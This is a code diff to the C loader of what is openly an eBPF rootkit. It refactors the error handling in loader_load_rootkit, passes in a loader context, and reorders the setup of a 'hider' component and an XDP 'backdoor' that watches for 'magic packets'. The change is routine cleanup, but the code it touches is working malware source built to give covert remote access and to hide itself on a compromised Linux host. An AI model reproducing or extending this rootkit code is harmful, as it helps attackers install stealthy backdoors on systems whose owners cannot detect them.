@@ -7,6 +7,7 @@
 #include <unistd.h>
 
 #include "config.h"
+#include "userspace/loader.h"
 #include "rootkit.skel.h"
 #include "userspace/hider.h"
 
@@ -63,7 +64,7 @@ static int load_xdp_backdoor(struct rootkit *skel) {
     return libbpf_get_error(skel->links.filter_magic_packets);
 }
 
-struct rootkit *loader_load_rootkit(void) {
+struct rootkit *loader_load_rootkit(loader_context_t *loader_ctx) {
     int ret;
     struct rootkit *skel;
 
@@ -76,34 +77,34 @@ struct rootkit *loader_load_rootkit(void) {
     ret = rootkit__load(skel);
     if (ret) {
         perror("Failed to load and verify BPF skeleton");
-        rootkit__destroy(skel);
-        return NULL;
-    }
-
-    hider_context_t hider_ctx = {.skel = skel, .is_initialized = false};
-
-    ret = hider_init(&hider_ctx);
-    if (ret) {
-        perror("Failed to initialize hider");
-        rootkit__destroy(skel);
-        return NULL;
+        goto fail;
     }
 
     ret = load_xdp_backdoor(skel);
     if (ret) {
         perror("Failed to attach XDP backdoor");
-        rootkit__destroy(skel);
-        return NULL;
+        goto fail;
+    }
+
+    loader_ctx->hider_ctx->skel = skel;
+
+    ret = hider_init(loader_ctx->hider_ctx);
+    if (ret) {
+        perror("Failed to initialize hider");
+        goto fail;
     }
 
     ret = rootkit__attach(skel);
     if (ret) {
         perror("Failed to attach BPF skeleton");
-        rootkit__destroy(skel);
-        return NULL;
+        goto fail;
     }
 
     return skel;
+
+fail:
+    rootkit__destroy(skel);
+    return NULL;
 }
 
 void loader_unload_rootkit(struct rootkit *skel) {
